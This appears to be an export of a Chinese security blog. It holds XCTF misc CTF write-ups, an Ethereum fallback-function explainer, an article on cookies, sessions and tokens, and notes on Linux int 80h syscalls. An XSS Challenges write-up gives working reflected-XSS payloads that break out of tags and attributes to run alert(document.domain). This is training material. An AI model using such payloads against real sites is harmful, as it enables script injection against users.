flag 四、坚持 60 s1.基础知识 java 的逆向：JD — GUI 2.题目要求 3.做题步骤 下载附件，发现是一个 java 程序包，运行该程序（前提电脑要有 java 运行环境），如下图： 开始玩这个游戏，发现自己怎么也坚持不住 60s，无奈只能对该程序进行逆向（我用的是 JD - GUI），在逆向的结果中搜索“flag”，发现在“PlaneGameFrame.class”中有该结果，于是打开该文件，得到如下结果： 发现 flag 中的好像进行了 base64 加密，于是用 python 进行解密，如下： 提交 flag ，回答正确。 五、gif1.基础知识 python 的 os 和 Pillow 模块 2.题目要求 3.解题步骤 下载附件，解压压缩包，打开 gif 文件夹，发现该文件夹里面由下面一系列图片构成： 这些图片代表什么意思呢？在分析了这些图片之后，得到大概的一个想法：这些图片是只由黑、白两种纯色构成，那么黑白的意思是不是代表 二进制中的1 和 0 呢？本着这个想法，我们开始想办法将这些图片用 1 和 0 代替。PS：因为图片太多，我想着用脚本来识别这些图片，再输出相应的数字，脚本如下： 运行脚本，得到如下的结果： 2020-2-2 更新 六、掀桌子1.基础知识 ASCII 值和字符的对应关系 2.题目要求 3.解题步骤 打开题目，看到题目中给出一串字符串，但是这和掀桌子有什么关系呢？？？？？？？ 难道只是将这些字符转代表的 ASCII 值转换为对应的字符？？？？？ 下面查查这些字符有多少吧。 12&gt; len("c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2")&gt; &gt; 得到的答案是“118”，正好是偶数，那么两两字符的 ASCII 值正好对应一个字符，说干就干！！ 写出脚本，计算出两两字符的ASCII值，并转换为对应的字符： 得到如下的结果： 从上面的结果可以看到，得到的 ASCII 值均大于 128，那么我们再减去 128 的基础上，算出他们的字符，代码如下： 执行修改过的代码，得到如下结果： 从上图的红圈中可以看到“flag is”说明我们的思路没有错误，那么下面我们只需要提交 flag{hjzcydjzbjdcjkzkcugisdchjyjsbdfr} 即可 七、SimpleRAR（隐写题）1.基础知识 png 在 WinRAR 中的文件头格式：https://wenku.baidu.com/view/b7889b64783e0912a2162aa4.html 2.题目要求 3.解题步骤 下载附件，并解压附件，只得到一个 “flag.txt” 的文件，打开该文件文件，得到如下内容： 从这个文件里面并没有得到实际的信息，那么下一步的思路是什么呢？ 查了查相关的 writeup 才知道这个压缩包用 WinRAR 打开，修改一下数据： 将上述蓝色阴影的 “A” 换成 “4”，然后保存，再将文件进行解压，得到如下的文件： 用 WinRAR 打开 secret.png 图片，得到下面的信息： 通过查阅资料，可以得到文件以“47 49 46 38 39 61”开头的图片格式是 gif 格式 将文件后缀名改为 .gif，再打开文件但是没有什么反应，于是用 Photoshop 打开该文件，可以看出有两个图层： 分别将这两个图层单独保存成两个 png 文件：1.png 和 2.png，再用 StegSolve 分别打开这两个图片，会得到两个图形，如下： 将这两个图形合到一起，再增加一个定位图形，会得到一个完整的二维码： 2020-2-3 更新 八、base64Stego（隐写题）1.基础知识 base64 的隐写： https://www.tr0y.wang/2017/06/14/Base64steg/index.html https://cltheorem.github.io/2018/10/base64%E9%9A%90%E5%86%99/ python 的几个方法: zfill 方法 index 方法 readlines 方法 count 方法 2.题目要求 3.解题步骤 下载并打开附件，发现好多行都是类似于 base64 编码后的数据，于是第一开始的思路是将这些数据 通过自己写的 base64 解码工具进行解码，脚本如下： 运行脚本，得到如下的结果： 通过分析得到的文本，并没有得到想要的 flag，但是得出这是一道隐写题：有关 base64 的隐写题，在查阅而资料后（第一部分的两个链接），写出了如下的脚本： 运行脚本，得到 flag： 2020-2-4 更新 九、ext31.基础知识 文件系统的挂载： 相关链接： mount 命令) 能否通俗易懂，深入浅出地解释一下linux中的挂载的概念？ 初窥Linux 之 ext2/ext3文件系统 2.题目要求 3.解题步骤 下载附件，并查看文件的类型： 可以看出，这是一个 ext3 文件系统，那么我们应该想到系统挂载 这一步我们来将文件进行挂载 12&gt; mount 附件 temp&gt; &gt; 我们得到如下的文件： 这么多文件夹，哪个文件夹里面有 flag 呢？ 从红圈标的内容中可以看出，在 “O7avZhikgKgbF” 文件夹中有一个 flag.txt 文件 打开 flag.txt 文件，得到一个base64编码后的数据：“ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=”，进行base64解码，得到如下的结果： 十、stegano1.基础知识 摩斯密码的基础知识： 摩尔斯电码 wiki) PDF.js 技术 pdf.js 技术 pdf.js插件下载地址 其他的writeup：https://www.jianshu.com/p/f502793c13bb 2.题目要求 3.解题步骤 下载附件 “pdf” 文件，用软件打开以后并没有发现有用的信息，用 pdf.js 技术来打开 pdf 文件：在 console 中输入document.documentElement.textContent ，会得到如下的信息： 将得到的信息复制下来，得到如下的内容： 从上图中蓝色阴影由 “A” 和 “B” 组成的信息，再加上不同的间隔，可以看出这可能是摩尔斯密码 下面写出脚本，对这些信息进行解密，脚本如下： 运行脚本，得到下面的结果： 2020-2-5 更新 十一、功夫再高也怕菜刀1.基础知识 jpg 图片的文件二进制格式：https://blog.csdn.net/STN_LCD/article/details/78629029 图片文件头格式总结：https://www.cnblogs.com/lwy-kitty/p/3928317.html wireshark 的使用 Winhex 的使用 2.题目要求 3.解题步骤 下载附件，发现附件是一个流量包，初猜那么这道题可能是一个流量包分析题，打开流量包，发现几乎都是 TCP 和 HTTP 组成，那么先尝试一下搜索一下 flag 关键词，看看是否有结果，搜索结果如下： 追踪一下 flag.txt 文件的 TCP 流，看看传输的是什么数据： 大略的看了一下这个流中的数据，发现结尾处是 jpg 图片的二进制结尾 “FFD9”，根据已有的经验找到 jpg 开头的 “FFD8” 格式： 将十六进制的数据放到 “Winhex” 中，并保存格式为 “jpg” 的图片，如下图： 将图片中的文字提交，发现提交的不对，说明这不是我们想求的 flag。 用 foremost 分离流量包，得到两个文件：audit.txt 和 zip 压缩包，打开 audit.txt 文件，得到如下信息： 下一步解压压缩包，却发现需要解压密码，那么就想到了前面所得图片中的信息，输入之后进行解压，解压成功，得到 flag 文件： 2020-02-09 更新]]></content>
      <tags>
        <tag>XCTF</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以太坊智能合约漏洞 | Fallback函数]]></title>
    <url>%2F2019%2F11%2F23%2F2019.11.23%EF%BC%8890%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、Fallback 函数介绍 合约可以有一个未命名的函数。这个函数不能有参数也不能有返回值，并且必须具有外部可见性。如果没有其他函数与给定的函数标识符匹配（或者根本没有提供任何数据），则在调用合同时执行该函数。 除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币并将其添加到合同的总余额中，fallback 函数必须标记为 payable。 如果不存在这样的函数，则合约不能通过常规交易接收以太币，并引发异常。 在这样的上下文中，通常只有很少的 gas 可以用来完成这个函数调用（准确地说，是 2300 gas），所以使 fallback 函数的调用尽量廉价很重要。 请注意，调用 fallback 函数的交易（而不是内部调用）所需的 gas 要高得多，因为每次交易都会额外收取 21000 gas 或更多的费用，用于签名检查等操作。 具体来说，以下操作会消耗比 fallback 函数更多的 gas： 写入存储 创建合约 调用消耗大量 gas 的外部函数 发送以太币 请确保您在部署合约之前彻底测试您的 fallback 函数，以确保执行成本低于 2300 个 gas。 除此之外，我们还可以这样理解 fallback 函数： If I have your wallet address, I can send you Ethers without your permission. In most cases, you might want to enable this ease-of-payment feature for your smart contracts too. This way, other contracts/wallets can send Ether to your contract, without having to know your ABI or specific function names.]]></content>
      <tags>
        <tag>区块链</tag>
        <tag>智能合约漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS Challenge（Stage1-4）writeup]]></title>
    <url>%2F2019%2F11%2F19%2F2019.11.19%EF%BC%8889%EF%BC%89%2F</url>
    <content type="text"><![CDATA[题目链接：XSS Challenges（共19关） Stage #1① 题目 ② 相关知识点 XSS 的类型 ③ 解题步骤 ▣ 首先看一下是否存在 XSS 攻击 ⚁ 首次尝试填入信息： ▣ 可以从上图中看出，我们写入的 Hello World 被放在了 &lt;b&gt; &lt;/b&gt; 标签中，我们可以在这个标签中进行 xss 攻击，脚本如下： 1payload：&lt;script&gt;alert(document.domain)&lt;/script&gt; // 之所以用 document.domain 是因为题目中的提示 ▣ 点击 search 之后，窗口会给我们弹出一个提示框，如下： 这就代表着我们成功的对该网页进行了 xss 攻击，下面让我们看一下源码，看一下浏览器是怎么渲染我们的输入： Stage #2① 题目 ② 相关知识点 close the current tag and add SCRIPT tag… ③ 解题步骤 ▣ 初尝试：先输入数据，看看网页源码 ▣ 从上图可以看出，我们输入的 Hello World 赋值给了 &lt;input&gt; 标签的 value 值，那么我们根据提示和第一次的尝试，可以对 value 标签进行闭合，然后进行 xss 攻击，攻击脚本如下： 1payload1: "&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; 1payload2: " onclick/onmouseoover=alert(document.domain)&gt;// 在这里简单的介绍一下 onclick、onmousedown、onmouseup、onmouseout、onmouseenter、onmouseleave 和 onmouseover 的功能： onclick ：在鼠标左健点击弹起之后触发的事件，即一次完整的鼠标点击过程。过程完成瞬间触发函数 onmouseover ：属性在鼠标指针移动到元素上时触发 onmousedown ：事件会在鼠标按键被按下时发生 onmouseup ：事件会在松开鼠标按键时触发 onmouseout ：属性在鼠标指针移动到元素外时触发 onmouseenter ：属性在鼠标指针移动到元素上时触发，onmouseover和onmouseenter唯一的区别是 onmouseenter 事件不支持冒泡 onmouseleave ：性在鼠标指针移动到元素外时触发， onmouseout和onmouseleave唯一的区别是 onmouseleave 事件不支持冒泡 。 Stage #3① 题目 ② 相关知识点 The input in text box is properly escaped. ③ 解题步骤 ▣ 初试 Hello World ： ▣ 从上图可以看到，我们输入 Hello World 以后，网页显示了两个内容： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;b&gt; &quot;Hellow World&quot; &lt;/b&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;b&gt; Japan &lt;/b&gt; 我们先尝试对第一处的进行标签闭合，如下图： 1payload: "&lt;/b&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;b&gt;" ▣ 我们从上图看到，我们的 payload 没有被执行，说明该处不能够进行 xss 攻击，那么我们尝试修改第二处的值，也就是 Japan 的值（这个的实现我们可以用 burp 工具进行）： 1payload："&lt;/b&gt;&lt;script&gt;alert(document.domain&gt;&lt;/script&gt;&lt;b&gt;" ▣ 从下图的源码可以看到我们成功的执行了我们的脚本： Stage #4① 题目 ② 相关知识点 invisible input field ③ 解题步骤 ▣ 我们可以看出，这道题目和上一道题目没有太大的区别，我们再通过 burp 对 &lt;b&gt; 两处可能存在的 xss 攻击进行尝试构建我们的脚本： 执行结果如下: ▣ 我们在两处都写入了我们的脚本，但是都没有被执行，在用 burp 抓包的过程中，我们发现，这道题比上一道题多了一个 Hack，那么我们是不是可以通过这个来实现 xss 攻击呢？我们先看一下 Hack 在页面哪个位置，如下图： ☛ 在这里我们补充一个知识点：input 的 type 属性 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● button：定义可点击按钮（多数情况下，用于通过 JavaScript 启动脚本） &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● checkbox：定义复选框 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● file：定义输入字段和 “浏览”按钮，供文件上传 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● hidden：定义隐藏的输入字段 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● image： 定义图像形式的提交按钮 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● password：定义密码字段。该字段中的字符被掩码 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● radio：定义单选按钮 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● reset：定义重置按钮。重置按钮会清除表单中的所有数据 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● submit：定义提交按钮。提交按钮会把表单数据发送到服务器 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● text：定义单行的输入字段，用户可在其中输入文本。默认宽度为 20 个字符 ▣ 从上图我们可以得到，有一个 &lt;input&gt; 标签被隐藏掉了，所以我们在网页中无法找见它，但是我们可以在 burp 改包，来进行 xss 攻击，攻击脚本如下： 1payload："&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; 效果如下图： ▣ 我们点击 Forward 以后，可以看到我们成功的执行了 xss 攻击：]]></content>
      <tags>
        <tag>web</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cookie、Session、Token那点事儿（转载）]]></title>
    <url>%2F2019%2F11%2F07%2F2019.11.07%EF%BC%8888%EF%BC%89%2F</url>
    <content type="text"><![CDATA[来自：简书，作者：骑小猪看流星 链接：https://www.jianshu.com/p/bd1be47a16c1 一、什么是Cookie？ Cookie 技术产生源于 HTTP 协议在互联网上的急速发展。随着互联网时代的策马奔腾，带宽等限制不存在了，人们需要更复杂的互联网交互活动，就必须同服务器保持活动状态（简称：保活）。 于是，在浏览器发展初期，为了适应用户的需求技术上推出了各种保持 Web 浏览状态的手段，其中就包括了 Cookie 技术。Cookie 在计算机中是个存储在浏览器目录中的文本文件，当浏览器运行时，存储在 RAM 中发挥作用 （此种 Cookies 称作 Session Cookies），一旦用户从该网站或服务器退出，Cookie 可存储在用户本地的硬盘上 （此种 Cookies 称作 Persistent Cookies）。 Cookie 起源：1993 年，网景公司雇员 Lou Montulli 为了让用户在访问某网站时，进一步提高访问速度，同时也为了进一步实现个人化网络，发明了今天广泛使用的 Cookie。（所以，适当的偷懒也会促进人类计算机发展史的一小步~） Cookie时效性：目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。 Cookie使用限制：Cookie 必须在 HTML 文件的内容输出之前设置；不同的浏览器 (Netscape Navigator、Internet Explorer) 对 Cookie 的处理不一致，使用时一定要考虑；客户端用户如果设置禁止 Cookie，则 Cookie 不能建立。 并且在客户端，一个浏览器能创建的 Cookie 数量最多为 300 个，并且每个不能超过 4KB，每个 Web 站点能设置的 Cookie 总数不能超过 20 个。 执行流程： A：首先，客户端会发送一个http请求到服务器端。 B： 服务器端接受客户端请求后，发送一个http响应到客户端，这个响应头，其中就包含Set-Cookie头部。 C：在客户端发起的第二次请求（注意：如果服务器需要我们带上Cookie，我们就需要在B步骤上面拿到这个Cookie然后作为请求头一起发起第二次请求），提供给了服务器端可以用来唯一标识客户端身份的信息。这时，服务器端也就可以判断客户端是否启用了cookies。尽管，用户可能在和应用程序交互的过程中突然禁用cookies的使用，但是，这个情况基本是不太可能发生的，所以可以不加以考虑，这在实践中也被证明是对的。 为了方便理解，可以先看下这张流程执行图加深概念: 那么，在浏览器上面的请求头和Cookie在那？下图给大家截取了其中一种: 二、Session Session是对于服务端来说的，客户端是没有Session一说的。Session是服务器在和客户端建立连接时添加客户端连接标志，最终会在服务器软件（Apache、Tomcat、JBoss）转化为一个临时Cookie发送给给客户端，当客户端第一请求时服务器会检查是否携带了这个Session（临时Cookie），如果没有则会添加Session，如果有就拿出这个Session来做相关操作。 在这里引用别人家的一个小故事来加深印象： 在说session是啥之前，我们先来说说为什么会出现session会话，它出现的机理是什么？ 我们知道，我们用浏览器打开一个网页，用到的是HTTP协议，了解计算机的应该都知道这个协议，它是无状态的，什么是无状态呢？就是说这一次请求和上一次请求是没有任何关系的，互不认识的，没有关联的。但是这种无状态的的好处是快速。所以就会带来一个问题就是，我希望几个请求的页面要有关联，比如：我在www.a.com/login.php里面登陆了，我在www.a.com/index.php 也希望是登陆状态，但是，这是2个不同的页面，也就是2个不同的HTTP请求，这2个HTTP请求是无状态的，也就是无关联的，所以无法单纯的在index.php中读取到它在login.php中已经登陆了！ 那咋搞呢？我不可能这2个页面我都去登陆一遍吧。或者用笨方法这2个页面都去查询数据库，如果有登陆状态，就判断是登陆的了。这种查询数据库的方案虽然可行，但是每次都要去查询数据库不是个事，会造成数据库的压力。所以正是这种诉求，这个时候，一个新的客户端存储数据方式出现了：cookie。cookie是把少量的信息存储在用户自己的电脑上，它在一个域名下是一个全局的，只要设置它的存储路径在域名www.a.com下 ，那么当用户用浏览器访问时，php就可以从这个域名的任意页面读取cookie中的信息。所以就很好的解决了我在www.a.com/login.php页面登陆了，我也可以在www.a.com/index.php获取到这个登陆信息了。 同时又不用反复去查询数据库。虽然这种方案很不错，也很快速方便，但是由于cookie 是存在用户端，而且它本身存储的尺寸大小也有限，最关键是用户可以是可见的，并可以随意的修改，很不安全。那如何又要安全，又可以方便的全局读取信息呢？于是，这个时候，一种新的存储会话机制：session 诞生了。 Session 就是在一次会话中解决2次HTTP的请求的关联，让它们产生联系，让2两个页面都能读取到找个这个全局的session信息。session信息存在于服务器端，所以也就很好的解决了安全问题。 三、Token token是用户身份的验证方式，我们通常叫它：令牌。最简单的token组成:uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign(签名，由token的前几位+盐以哈希算法压缩成一定长的十六进制字符串，可以防止恶意第三方拼接token请求服务器)。还可以把不变的参数也放进token，避免多次查库。 应用场景： A：当用户首次登录成功（注册也是一种可以适用的场景）之后, 服务器端就会生成一个 token 值，这个值，会在服务器保存token值(保存在数据库中)，再将这个token值返回给客户端. B：客户端拿到 token 值之后,进行本地保存。（SP存储是大家能够比较支持和易于理解操作的存储） C：当客户端再次发送网络请求(一般不是登录请求)的时候,就会将这个 token 值附带到参数中发送给服务器. D：服务器接收到客户端的请求之后,会取出token值与保存在本地(数据库)中的token值做对比 对比一：如果两个 token 值相同， 说明用户登录成功过!当前用户处于登录状态! 对比二：如果没有这个 token 值, 则说明没有登录成功. 对比三：如果 token 值不同: 说明原来的登录信息已经失效,让用户重新登录. 四、三者的区别1. Cookie和Session的区别 cookie数据存放在客户的浏览器上，session数据放在服务器上。 cookie不是很安全，别人可以分析存放在本地的cookie并进行cookie欺骗,考虑到安全应当使用session。 session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能,考虑到减轻服务器性能方面，应当使用cookie。 单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。 所以个人建议： 将登陆信息等重要信息存放为session 其他信息如果需要保留，可以放在cookie中 2. Token 和 Session 的区别 Session和 token并不矛盾，作为身份认证token安全性比session好，因为每个请求都有签名还能防止监听以及重放攻击，而session就必须靠链路层来保障通讯安全了。如上所说，如果你需要实现有状态的会话，仍然可以增加session来在服务器端保存一些状态。 App通常用restful api跟server打交道。Rest是stateless的，也就是app不需要像browser那样用cookie来保存session,因此用session token来标示自己就够了，session/state由api server的逻辑处理。如果你的后端不是stateless的rest api,那么你可能需要在app里保存session.可以在app里嵌入webkit,用一个隐藏的browser来管理cookie session. Session是一种HTTP存储机制，目的是为无状态的HTTP提供的持久机制。所谓Session认证只是简单的把User信息存储到Session里，因为SID的不可预测性，暂且认为是安全的。这是一种认证手段。而Token，如果指的是OAuth Token或类似的机制的话，提供的是 认证 和 授权 ，认证是针对用户，授权是针对App。其目的是让 某App有权利访问 某用户 的信息。这里的Token是唯一的。不可以转移到其它App上，也不可以转到其它 用户 上。转过来说Session。Session只提供一种简单的认证，即有此SID，即认为有此User的全部权利。是需要严格保密的，这个数据应该只保存在站方，不应该共享给其它网站或者第三方App。所以简单来说，如果你的用户数据可能需要和第三方共享，或者允许第三方调用API接口，用Token。如果永远只是自己的网站，自己的App，用什么就无所谓了。 token就是令牌，比如你授权（登录）一个程序时，他就是个依据，判断你是否已经授权该软件；cookie就是写在客户端的一个txt文件，里面包括你登录信息之类的，这样你下次在登录某个网站，就会自动调用cookie自动登录用户名；session和cookie差不多，只是session是写在服务器端的文件，也需要在客户端写入cookie文件，但是文件里是你的浏览器编号.Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。 四、相关文章 Cookie、Session、Token那点事儿 彻底弄懂session，cookie，token ★★★★ Cookie、Session、Token ★★★★]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有关内核调用问题和预编译指令]]></title>
    <url>%2F2019%2F11%2F05%2F2019.11.05%EF%BC%8887%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、知识点摘要 系统调用 int 80h 中断 #ifdef ……# endif 的含义和用法 二、知识点介绍1.int 80h 中断 1) 什么是 system call? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system call 是指运行在使用者空间的程序向操作系统内核请求需要更高权限运行的服务。system call 提供了用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态执行。如设备IO操作或者进程间通信 。(操作系统—WIKI )) 2) 什么是 int 80h 中断？ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Linux 的 system call 就是通过int 80h来实现的，int 80h 是通过系统调用号来区分入口的函数。 3) 操作系统实现 system call 的基本过程: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;①&nbsp;&nbsp;应用程序调用库函数（API）； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②&nbsp;&nbsp;API 将系统调用号存入 eax，然后通过中断调用使系统进入内核态； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③&nbsp;&nbsp;内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④&nbsp;&nbsp;系统调用完成相应功能，将返回值存入eax，返回到中断处理函数； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤&nbsp;&nbsp;中断处理函数返回到 API 中； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑥&nbsp;&nbsp;API 将 eax 返回给应用程序。4) 系统调用号 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们再来想几个小问题： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ 系统调用号定义在哪里？ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Linux 的系统调用号定义在了 /usr/include/asm/unistd.h 文件中，如下所示： 1234567891011121314151617181920&gt; # cat /usr/include/asm/unistd.h&gt; &gt; /* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */&gt; #ifndef _ASM_X86_UNISTD_H&gt; #define _ASM_X86_UNISTD_H&gt; &gt; /* x32 syscall flag bit */&gt; #define __X32_SYSCALL_BIT 0x40000000&gt; &gt; # ifdef __i386__&gt; # include &lt;asm/unistd_32.h&gt;&gt; # elif defined(__ILP32__)&gt; # include &lt;asm/unistd_x32.h&gt;&gt; # else&gt; # include &lt;asm/unistd_64.h&gt;&gt; # endif&gt; &gt; #endif /* _ASM_X86_UNISTD_H */&gt; &gt; &gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;再来简单的看一下 unistd_x32 、unisted_32和 unisted64 中的信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&gt; #/usr/include/asm/unistd_x32.h&gt; &gt; #ifndef _ASM_X86_UNISTD_X32_H&gt; #define _ASM_X86_UNISTD_X32_H 1&gt; &gt; #define __NR_read (__X32_SYSCALL_BIT + 0)&gt; #define __NR_write (__X32_SYSCALL_BIT + 1)&gt; #define __NR_open (__X32_SYSCALL_BIT + 2)&gt; #define __NR_close (__X32_SYSCALL_BIT + 3)&gt; #define __NR_stat (__X32_SYSCALL_BIT + 4)&gt; #define __NR_fstat (__X32_SYSCALL_BIT + 5)&gt; #define __NR_lstat (__X32_SYSCALL_BIT + 6)&gt; #define __NR_poll (__X32_SYSCALL_BIT + 7)&gt; #define __NR_lseek (__X32_SYSCALL_BIT + 8)&gt; …………………………………………………………………………&gt; &gt; #/usr/include/asm/unistd_32.h&gt; &gt; #ifndef _ASM_X86_UNISTD_32_H&gt; #define _ASM_X86_UNISTD_32_H 1&gt; &gt; #define __NR_restart_syscall 0&gt; #define __NR_exit 1&gt; #define __NR_fork 2&gt; #define __NR_read 3&gt; #define __NR_write 4&gt; #define __NR_open 5&gt; #define __NR_close 6&gt; #define __NR_waitpid 7&gt; #define __NR_creat 8&gt; #define __NR_link 9&gt; #define __NR_unlink 10&gt; …………………………………………………………………………&gt; &gt; #/usr/include/asm/unistd_64.h&gt; &gt; #ifndef _ASM_X86_UNISTD_64_H&gt; #define _ASM_X86_UNISTD_64_H 1&gt; &gt; #define __NR_read 0&gt; #define __NR_write 1&gt; #define __NR_open 2&gt; #define __NR_close 3&gt; #define __NR_stat 4&gt; #define __NR_fstat 5&gt; #define __NR_lstat 6&gt; #define __NR_poll 7&gt; #define __NR_lseek 8&gt; #define __NR_mmap 9&gt; #define __NR_mprotect 10&gt; …………………………………………………………………………&gt; &gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ 系统调用号的含义是什么？ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于不同的系统调用号，所代表的入口函数是不一样的，其实我们在上面的定义中就能知道不同序号代表的函数是什么，下面我以 32 位的系统给出几个系统调用表对应的函数： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;※ 如何执行 system call ? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这里，我们用一个例子来详细的解释一下： 123456789101112&gt; .text:08048087 mov ecx, esp ; addr&gt; .text:08048089 mov dl, 14h ; len，对应参数为：size_t count&gt; .text:0804808B mov bl, 1 ; fd，对应参数 fd，fd = 1，在linux 中对应于 stdout，指的是显示屏的标准输出&gt; .text:0804808D mov al, 4 ; 系统调用号为 4，sys_write&gt; .text:0804808F int 80h ; LINUX - sys_write&gt; .text:08048091 xor ebx, ebx ; ebx = 0，对应的参数 fd = 0，在 Linux 中对应于 stdin，指的是显示屏的标准输入&gt; .text:08048093 mov dl, 3Ch ; len，对应参数为：size_t count&gt; .text:08048095 mov al, 3 ; 系统调用号为3，sys_read&gt; .text:08048097 int 80h ; LINUX - sys_read&gt; .text:08048099 add esp, 14h&gt; .text:0804809C retn&gt; &gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将上面的汇编语言反汇编成伪代码，如下： 1234&gt; sys_write(unsigned int fd, const char * buf, size_t count);&gt; &gt; sys_read(unsigned int fd, char * buf, size_t count);&gt; 2.#if……# endif 1) \#if……\#endif 是什么？ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #if ……#endif 其实是 C#两个预处理器指令， 如果 C# 编译器遇到最后面跟有 #endif) 指令的#if 指令，则仅当指定的符号已定义时，它才会编译这两个指令之间的代码。 例如： 12345678910111213141516&gt; --在最顶端必须声明自定义的名称DEBUG或者START&gt; #define DEBUG &gt; //#define START&gt; //using System;&gt; //...&gt; &gt; &gt; 在你需要的代码中插入#if..#endif，编译器会自动寻找，并执行之间的这段代码&gt; #if DEBUG&gt; Console.WriteLine("Debug version");&gt; #endif&gt; &gt; #if START&gt; Console.WriteLine("START PROCESS");&gt; #endif&gt; &gt; 2) 预处理器的指令还有哪些？ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #if 、 #else 、 #elif 、 #endif 、 #define 、 #undef 、 #warning 、 #error 、 #line 、 #region 、 #endregion 、 #pragma 、 #pragma warning 、 #pragma checksum 3) #if 0，#if 1，#else，#endif语句 12345678910&gt; #if 0&gt; &gt; code1&gt; &gt; #else&gt; &gt; code2&gt; &gt; #endif&gt; &gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时code1的语句被注释掉了，永远没有办法执行，而code2是被编译的；如果将#if 0变为#if 1，code1被编译，而code2永远没有办法被执行。 三、相关知识点 操作系统的内核和用户的关系 Linux下 文件描述符（fd）与 文件指针（FILE*） C语言的 open, read, write函数，及文件读写 四、参考文章 Linux系统调用 int 80h int 0x80 ★★★★ 《第一篇 linux 0.12 系统调用(int 0x80)详解》★★ int 0x80系统调用的参数传递规则 linux系统调用表(system call table)★★★★ #if（C# 参考） C# 中的#if、#elif、#else、#endif、#define、#undef等预处理器指令 C语言中#if 0，#if 1，#else，#endif的作用 C#中 #if #endif的使用 Linux下 文件描述符（fd）与 文件指针（FILE*）(待看) 操作系统 